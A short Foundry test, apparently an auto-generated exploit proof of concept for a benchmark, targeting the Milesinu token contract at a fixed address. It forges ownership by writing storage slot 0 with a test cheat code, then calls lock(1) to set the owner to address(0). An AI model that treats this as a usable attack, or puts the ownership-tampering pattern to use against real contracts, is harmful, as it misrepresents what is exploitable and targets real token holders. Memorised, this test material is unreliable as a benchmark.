pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Milesinu {
    function owner() external view returns (address);
    function lock(uint256 time) external;
    function unlock() external;
    function renounceOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // _owner is the first variable in Ownable contract at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now the owner
        address currentOwner = Milesinu(TARGET).owner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 2: Call lock(1) as the owner
        vm.prank(attacker);
        Milesinu(TARGET).lock(1);

        // Step 3: Verify owner is now address(0)
        address finalOwner = Milesinu(TARGET).owner();
        require(finalOwner == address(0), "Owner not set to address(0)");

        // The oracle will check that owner == address(0)
        assertEq(finalOwner, address(0), "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

